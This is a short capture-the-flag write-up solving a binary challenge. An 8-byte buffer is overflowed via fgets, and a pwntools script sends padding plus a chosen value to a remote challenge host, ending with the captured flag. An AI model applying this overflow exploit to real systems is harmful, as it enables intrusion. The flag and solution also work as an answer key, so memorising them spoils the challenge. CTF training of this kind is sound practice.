# Description:

Tell me your favorite number and I might give you the flag ;).

```
nc chall.pwnoh.io 13372
```

# Solution
Use IDA64 to decompile binaryfile, easyly that fgets read 80 byte of "favoriteNumber" but favoriteNumber[8] have only 8 byte 

![image](https://github.com/N1GHT-F4LL/CTF/assets/60804710/13b3cb16-cef1-475b-972c-913d656961eb)


```
from pwn import *

#p = process('./buffer')
#elf = ELF('./buffer')
p = remote('chall.pwnoh.io', 13372)
res = p.recvuntil(':')
print(res)
offset = 60
payload = b'a' * offset + p64(0x45454545)
p.sendline(payload)

p.interactive()
```

#bctf{wHy_WriTe_OveR_mY_V@lUeS}
